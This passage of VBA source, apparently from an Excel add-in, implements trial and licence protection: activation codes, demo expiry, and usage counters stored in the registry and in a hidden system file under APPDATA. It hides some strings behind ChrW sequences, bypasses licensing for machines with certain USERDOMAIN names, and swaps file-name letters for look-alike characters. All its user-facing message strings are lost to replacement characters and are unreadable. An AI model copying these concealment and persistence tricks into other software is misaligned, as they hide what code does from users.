    If ver& = 0 Then ver& = Val(ThisWorkbook.BuiltinDocumentProperties("Revision Number")): If ver& = 0 Then ver& = 1009
    vArr = Array("", " Alfa", " Beta", " RC", " RC2", " RC3", " RC4", " RC5", " RC6"): verType$ = vArr(ver& Mod 10)
    GetVersionTXT = ver& \ 1000 & "." & Right(ver& \ 100, 1) & "." & Right(ver& \ 10, 1) & verType$
End Function
Sub SetVersion(ByVal n As Long)
    On Error Resume Next: If n < 1000 Then n = 1009
    If n Mod 10 = 0 Then n = n + 9
    ThisWorkbook.BuiltinDocumentProperties("Revision Number") = n
    ThisWorkbook.BuiltinDocumentProperties("Creation Date") = Now
End Sub
Function sss() As Long: CounterUpdate 2: sss = 0: End Function
Function mmm() As Long: CounterUpdate 2: mmm = 1: End Function
Function bbb() As Boolean: CounterUpdate 2: bbb = True: End Function
Function vbCheck() As Long: CounterUpdate 1: vbCheck = 0: End Function

Function AnyLicense() As Boolean: AnyLicense = CAC_: End Function
Function DemoLicense() As Boolean: DemoLicense = CAC_ And AC_$ = DEMO_ACTIVATION_CODE$: End Function
Function FullLicense() As Boolean: FullLicense = CAC_ And AC_$ <> DEMO_ACTIVATION_CODE$: End Function
Function NoLicense() As Boolean: NoLicense = Not CAC_: End Function
Function Developer() As Boolean: Developer = TrueDeveloper And (Dir("c:\testmode", vbNormal) = ""): End Function
Function TrueDeveloper() As Boolean:
    txt$ = Environ(ChrW(85) & ChrW(83) & ChrW(69) & ChrW(82) & ChrW(68) & ChrW(79) & ChrW(77) & ChrW(65) & ChrW(73) & ChrW(78)): TrueDeveloper = (txt$ Like ChrW(73) & ChrW(71) & ChrW(79) & ChrW(82) & ChrW(72) & ChrW(79) & ChrW(77) & ChrW(69) & ChrW(42)) Or (txt$ Like ChrW(73) & ChrW(71) & ChrW(79) & ChrW(82) & ChrW(87) & ChrW(79) & ChrW(82) & ChrW(75) & ChrW(42))
End Function
Function VER_(Optional ByVal Version&) As Long
    On Error Resume Next
    If Version& Then CreateObject("WScript.Shell").RegWrite BASE_REGISTRY_PATH$ & "version", Version&
    VER_ = Val(CreateObject("WScript.Shell").RegRead(BASE_REGISTRY_PATH$ & "version"))
End Function
Function UpdatesInfo_$(Optional ByVal txt$)
    On Error Resume Next
    If Len(txt$) Then CreateObject("WScript.Shell").RegWrite BASE_REGISTRY_PATH$ & "updates", txt$
    UpdatesInfo_$ = CreateObject("WScript.Shell").RegRead(BASE_REGISTRY_PATH$ & "updates")
End Function
Function AC_$(Optional ByVal code$)
    On Error Resume Next
    If Len(code$) Then CreateObject("WScript.Shell").RegWrite BASE_REGISTRY_PATH$ & "code", code$
    AC_$ = CreateObject("WScript.Shell").RegRead(BASE_REGISTRY_PATH$ & "code")
End Function
Function RE_$(Optional ByVal Email$)
    On Error Resume Next
    If Len(Email$) Then CreateObject("WScript.Shell").RegWrite BASE_REGISTRY_PATH$ & ChrW(101) & ChrW(109) & ChrW(97) & ChrW(105) & ChrW(108), Email$
    RE_$ = CreateObject("WScript.Shell").RegRead(BASE_REGISTRY_PATH$ & ChrW(101) & ChrW(109) & ChrW(97) & ChrW(105) & ChrW(108))
End Function
Function CAC_(Optional ByRef response$) As Boolean
    If DEBUG_MODE Then Debug.Print "starting CAC_", ""
    On Error Resume Next: Err.Clear: Dim res As Boolean, ExpiredDate As Double, msg$
    response$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & Val(RSP(1)) & ")"
    If Val(RSP(1)) < 0 Then response$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"

    code$ = AC_$: If code$ = "" Then Exit Function

    Select Case code$
        Case DEMO_ACTIVATION_CODE$
            If Len(RSP(8)) Then ExpiredDate = CDate(RSP(8))
            If ExpiredDate > 0 Then
                If Now <= ExpiredDate Then
                    response$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & DateDiff("h", Now, ExpiredDate) & " |fffd||fffd||fffd||fffd||fffd|)"
                    CAC_ = True
                Else
                    WSP 8, 1
                End If
            End If
        Case Else
            res = Val(Trim(code$)) = CLng(EnDeCrypt(HID, True)) * CLng(EnDeCrypt(PROJECT_NAME$, True)) + 171
            CAC_ = res
            If res Then
                response$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                If Len(RE_$) Then response$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| " & RE_$
            End If
    End Select
End Function

Function ValidateAC(ByVal code$, Optional ByRef msg$, Optional ByRef msg2$) As Boolean
    If DEBUG_MODE Then Debug.Print "starting ValidateAC", code$
    On Error Resume Next: Err.Clear: Dim res As Boolean, ExpiredDate As Double
    SavedCode$ = AC_$
    res = Val(Trim(SavedCode$)) = CLng(EnDeCrypt(HID, True)) * CLng(EnDeCrypt(PROJECT_NAME$, True)) + 171
    If res Then
        msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        ValidateAC = True: Exit Function        ': ND "code activation", msg$
    End If
    Select Case code$
        Case DEMO_ACTIVATION_CODE$
            res = CAC_
            If SavedCode$ = code$ Then
                msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd|" & code$ & "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!": ValidateAC = res:
                ND "code activation", msg$ & vbLf & CountersCurrentValues: Exit Function
            End If
            If Len(RSP(8)) Then ExpiredDate = CDate(RSP(8))
            If ExpiredDate = 0 Then
                WSP 8, CDbl(Now) + 2: WSP 7, 1
                msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 2 |fffd||fffd||fffd|"
                msg2$ = "Start DEMO": ValidateAC = True: AC_$ code$
            Else
                If Now > ExpiredDate Then
                    msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                    msg2$ = "Stop DEMO": ValidateAC = False: WSP 8, 1
                Else
                    hrs = DateDiff("h", Now, ExpiredDate)
                    msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| " & Format(ExpiredDate, "HH:MM:SS  D MMMM YYYY")
                    msg2$ = "Continue DEMO": ValidateAC = True: AC_$ code$
                End If
            End If
        Case Else
            res = Val(Trim(code$)) = CLng(EnDeCrypt(HID, True)) * CLng(EnDeCrypt(PROJECT_NAME$, True)) + 171
            ValidateAC = res
            If res Then
                msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|!": AC_$ code$
                msg2$ = "Activated!"
            Else
                msg$ = "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                msg2$ = "Error code!"
            End If
    End Select
    ND "code validation", "|fffd||fffd||fffd|: " & code$ & ", res=" & UCase(ValidateAC) & ", msg=""" & IIf(Len(msg2$) > 0, msg2$, msg$) & """"
End Function

Function CheckParameters(Optional ByVal index&) As Boolean
    If DEBUG_MODE Then Debug.Print "starting CheckParameters", index&
    On Error Resume Next
    res1 = RegistryInfo: Arr1 = Split(EnDeCrypt(res1), "%&$")
    If index& = 1 Then CheckParameters = Len(res1) > 0: Exit Function
    res2 = SP_FILE: arr2 = Split(EnDeCrypt(res2), "%&$")
    If index& = 2 Then CheckParameters = Len(res2) > 0: Exit Function
    CheckParameters = res1 = res2
    Select Case True
        Case UBound(Arr1) > UBound(arr2): SP_FILE$ res1
        Case UBound(arr2) > UBound(Arr1): CreateObject("WScript.Shell").RegWrite BASE_REGISTRY_PATH$ & "info", Replace(res2, Chr(0), "nullchar")
    End Select
End Function

Function IsFirstRun() As Boolean
    On Error Resume Next
    Dim con1 As Boolean, con2 As Boolean, con3 As Boolean
    If CheckParameters(1) Then Exit Function Else con1 = True
    If CheckParameters(2) Then Exit Function Else con2 = True
    con3 = Dir(SP_FILE("filename"), vbSystem + vbHidden) = ""
    IsFirstRun = con1 And con2 And con3
End Function

Function SP_FILE(Optional ByVal txt) As String
    File$ = Environ(ChrW(65) & ChrW(80) & ChrW(80) & ChrW(68) & ChrW(65) & ChrW(84) & ChrW(65)) & ChrW(92) & PROJECT_NAME$
    On Error Resume Next: Set FSO = CreateObject("scripting.filesystemobject")
    If IsMissing(txt) Then
        Set ts = FSO.OpenTextFile(File$, 1, False)
        SP_FILE = ts.ReadAll: ts.Close
    Else
        If txt = "filename" Then SP_FILE = File$: Exit Function
        SetAttr File$, vbNormal
        Set ts = FSO.CreateTextFile(File$, True): ts.Write txt
        SetAttr File$, vbHidden + vbSystem
    End If
    Set ts = Nothing: Set FSO = Nothing: Err.Clear
End Function

Function RegistryInfo(Optional ByVal txt) As String
    On Error Resume Next: Set wsh = CreateObject("WScript.Shell")
    If IsMissing(txt) Then
        RegistryInfo = Replace(wsh.RegRead(BASE_REGISTRY_PATH$ & "info"), "nullchar", Chr(0))
    Else
        wsh.RegWrite BASE_REGISTRY_PATH$ & "info", Replace(txt, Chr(0), "nullchar")
    End If
    Set wsh = Nothing
End Function

Function RSP(ByVal index As Long)
    If DEBUG_MODE Then Debug.Print "RSP", index
    On Error Resume Next: CheckParameters
    RSP = Split(EnDeCrypt(RegistryInfo), "%&$")(index)
End Function

Function CountersCurrentValues() As String
    On Error Resume Next
    d1$ = Format(CDate(RSP(3)), "DD.MM.YY")
    d2$ = Format(CDate(RSP(4)), "DD.MM.YY")
    CountersCurrentValues = "v." & GetVersion & ", " & Val(RSP(1)) & "/" & IIf(Val(GHV("h_c1")) > 0, Val(GHV("h_c1")), 30) & _
                            ", " & Val(RSP(2)) & "/" & IIf(Val(GHV("h_c2")) > 0, Val(GHV("h_c2")), 30) & ", " & "" & d1$ & "/" & d2$
End Function

Function SetValuesOnFirstRun()
    On Error Resume Next: Err.Clear
    RegistryInfo "---"
    WSP 0, PROJECT_NAME$
    WSP 1, IIf(Val(GHV("h_c1")) > 0, Val(GHV("h_c1")), 30)
    WSP 2, IIf(Val(GHV("h_c2")) > 0, Val(GHV("h_c2")), 1000)
    WSP 3, CDbl(Now): WSP 5, 0: WSP 6, 1
    DoEvents
    res = CheckParameters
    ND "first run", IIf(res, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & Val(GHV("h_c1")), _
                        "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: CheckParameters=FALSE") & vbLf & CountersCurrentValues
    If Not res Then MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!" & vbNewLine & _
       "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|-|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Windows |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
       "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & PROJECT_NAME$ & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, " & vbNewLine & _
       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| ICQ \ Skype", vbCritical, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
End Function

Function WSP(ByVal index As Long, ByVal Value)
    If DEBUG_MODE Then Debug.Print "WSP", index, Value
    On Error Resume Next: Err.Clear: Dim arr
    If IsFirstRun Then Debug.Print IIf(DEBUG_MODE, "First run detected ...", ""): SetValuesOnFirstRun
    arr = Split(EnDeCrypt(RegistryInfo), "%&$")
    If UBound(arr) < index Then ReDim Preserve arr(0 To index)
    arr(index) = Value: txt = EnDeCrypt(Join(arr, "%&$"))
    RegistryInfo txt
    SP_FILE txt
    Err.Clear
End Function

Function PL_(Optional ByRef msg, Optional ByVal silent As Boolean) As Boolean
    If FullLicense Then Exit Function
    On Error Resume Next
    If Len(RSP(4)) > 0 And DemoLicense Then
        If CDate(RSP(4)) > Now + TimeSerial(1, 10, 0) Then
            WSP 8, 1
            ImmediateMsg = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!" & vbNewLine & vbNewLine & _
                           "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                           "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
                           "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd|"
            If Not silent Then ND "time exceeded", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbLf & CountersCurrentValues
            If Not silent Then MsgBox ImmediateMsg, vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        End If
    End If
    If Len(RSP(4)) = 0 Then WSP 4, CDbl(Now) Else If CDate(RSP(4)) < Now Then WSP 4, CDbl(Now)
    If AnyLicense Then Exit Function

    If Val(RSP(1)) < 0 Then
        msg = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
              "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)," & vbNewLine & _
              "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        If AC_$ <> DEMO_ACTIVATION_CODE$ Then
            msg = msg & vbNewLine & vbNewLine & "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                  "|fffd||fffd| 48 |fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        End If
        If Not silent Then ND "limit exceeded", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbLf & CountersCurrentValues
        PL_ = True: Exit Function
    End If
    If Val(RSP(2)) < 0 Then
        msg = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
              "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)," & vbNewLine & _
              "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        If AC_$ <> DEMO_ACTIVATION_CODE$ Then
            msg = msg & vbNewLine & vbNewLine & "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                  "|fffd||fffd| 48 |fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        End If
        If Not silent Then ND "limit exceeded", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbLf & CountersCurrentValues
        PL_ = True: Exit Function
    End If
    If Len(RSP(3)) Then
        If CDate(RSP(3)) - Now > 365 Then
            msg = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                  "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)," & vbNewLine & _
                  "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            If Not silent Then ND "time exceeded", "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbLf & CountersCurrentValues
            PL_ = True: Exit Function
        End If
    End If
End Function
Sub SHV(ByVal Parameter As String, ByVal NewValue As String)
    Dim n As Name: On Error Resume Next: Err.Clear
    NewValue = "%%" & NewValue & "%%"
    ThisWorkbook.Names(Parameter).RefersTo = NewValue
    If Err Then ThisWorkbook.Names.Add Parameter, NewValue
    ThisWorkbook.Names(Parameter).Visible = False
End Sub
Function GHV(ByVal Parameter As String) As String
    On Error Resume Next: GHV = ThisWorkbook.Names(Parameter).RefersTo
    GHV = Split(GHV, "%%")(1)
End Function
Function CTR_(ByVal txt$) As String
    On Error Resume Next: sa1$ = "ABCEHMOPTXaceopxy": sa2$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": If txt Like Chr(42) & Chr(69) & Chr(88) & Chr(69) Then CTR_ = txt: Exit Function
    If txt Like "*\*" Then tb$ = Mid(txt, 1, InStrRev(txt, "\")): txt = Mid(txt, InStrRev(txt, "\") + 1)
    tp$ = Mid(txt, 2, InStrRev(txt, ".") - 2)
    For i = 1 To Len(tp)
        x = InStr(1, sa1, Mid(tp, i, 1), 0): If x Then Mid(tp, i, 1) = Mid(sa2, x, 1)
    Next
